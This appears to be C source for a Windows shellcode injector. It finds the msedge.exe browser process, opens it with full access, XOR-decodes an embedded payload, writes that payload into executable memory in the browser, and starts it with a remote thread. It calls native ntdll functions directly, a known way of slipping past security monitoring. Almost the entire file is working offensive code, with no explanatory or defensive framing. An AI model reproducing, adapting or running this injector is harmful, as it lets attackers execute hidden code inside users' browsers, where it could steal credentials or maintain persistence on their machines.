#include <windows.h>
#include <winternl.h> 
#include <stdlib.h> // For memory allocation functions
#include <stdio.h>
#include <wchar.h> // For wide-character string functions
#include "buffer.h"


#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// For initializing OBJECT_ATTRIBUTES
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

// For NTSTATUS and NTAPI definitions// Typedefs for the NTAPI functions to use
typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS(NTAPI* pfnNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten);

typedef NTSTATUS(NTAPI* pfnRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    CLIENT_ID* ClientID);

typedef NTSTATUS(NTAPI* pfnNtClose)(
    HANDLE);
typedef NTSTATUS(NTAPI* pfnNtOpenProcess)(
    PHANDLE, 
    ACCESS_MASK, 
    POBJECT_ATTRIBUTES, 
    CLIENT_ID*);


#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif


// Typedef for NtQuerySystemInformation
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);


// XORs each byte of the buffer with a given key
void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}


int FindTarget(const wchar_t* process, HMODULE hNtdll) {

    // Get the NtQuerySystemInformation function address
    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        FreeLibrary(hNtdll);
        return 1;
    }

    // Prepare to call NtQuerySystemInformation
    PVOID buffer = NULL;
    ULONG bufferSize = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    int pid = 0;

    // The first call gets the required buffer size.
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        buffer = malloc(bufferSize);
        if (!buffer) {
            FreeLibrary(hNtdll);
            return 1;
        }

        // Call again with the correct size
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    }

    // Here is the structure of "SYSTEM_PROCESS_INFORMATION"
    // https://processhacker.sourceforge.io/doc/struct___s_y_s_t_e_m___p_r_o_c_e_s_s___i_n_f_o_r_m_a_t_i_o_n.html
    if (NT_SUCCESS(status)) {
        // Iterate over the SYSTEM_PROCESS_INFORMATION structures in buffer
        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (spi) {
            if (spi->ImageName.Length && spi->UniqueProcessId != 0) {

                size_t procnameSize = (spi->ImageName.Length + sizeof(WCHAR));
                WCHAR* procname = (WCHAR*)malloc((spi->ImageName.Length + sizeof(WCHAR)));
                // Dynamic allocation for the process name
                if (procname == NULL) {
                    return pid; // Handle error appropriately
                }

                // Correct usage, ensuring there's space for null terminator:
                wcsncpy_s(procname, procnameSize, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR));

                // Ensuring NULL termination
                procname[spi->ImageName.Length / sizeof(WCHAR)] = L'\0';

                // Compare procname with another process name
                if (wcscmp(procname, process) == 0) {
                    // If procname and process are equal
                    int pid = (int)(spi->UniqueProcessId);
                    free(procname);
                    return pid;
                    break;
                }

                // Free the allocated memory for procname when done
                free(procname);
                if (spi->NextEntryOffset == 0) {
                    break;
                }

            }
            spi = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)spi) + spi->NextEntryOffset);
        }
    }

    // Cleanup
    if (buffer) {
        free(buffer);
    }
    FreeLibrary(hNtdll);
    return pid;
}

// Implement the Inject function using NTAPI
int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len, HMODULE hNtdll) {

    // Get the NTAPI function addresses
    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pfnNtWriteVirtualMemory NtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pfnRtlCreateUserThread RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !RtlCreateUserThread) return -1;

    PVOID pRemoteCode = NULL;
    SIZE_T ulSize = buf_len;
    NTSTATUS status;

    // Allocate memory in the target process
    status = NtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &ulSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) return -1;

    // Write the payload to the allocated memory
    ULONG bytesWritten;
    status = NtWriteVirtualMemory(hProc, pRemoteCode, buf, buf_len, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != buf_len) return -1;

    HANDLE hThread = NULL;
    // Create a remote thread to execute the payload
    status = RtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, pRemoteCode, NULL, &hThread, NULL);
    if (!NT_SUCCESS(status) || hThread == NULL) return -1;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0; // Success
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    int pid = 0;

    const wchar_t* target_process = L"msedge.exe";

    // Setup for calling NtOpenProcess
    HANDLE hProc;
    OBJECT_ATTRIBUTES ObjAttr;
    CLIENT_ID clientId;

    // Load ntdll.dll which contains the NTAPI functions
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) return -1;

    pfnNtOpenProcess NtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pfnNtClose NtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");

    if (!NtClose || !NtOpenProcess) return -1;


    // Find the process ID
    pid = FindTarget(target_process, hNtdll);

    if (pid == 0) {
        wprintf(L"failed to find %s process\n", target_process);
        return 0;
    }

    clientId.UniqueProcess = (HANDLE)pid; // Target Process ID
    clientId.UniqueThread = 0; // Not specifying a thread

    InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjAttr, &clientId);

    if (status == STATUS_SUCCESS) {
        XOR(buf, sizeof(buf)); // put this into inject payload
        Inject(hProc, buf, sizeof(buf), hNtdll);
        NtClose(hProc);
    }

    return 0;
}
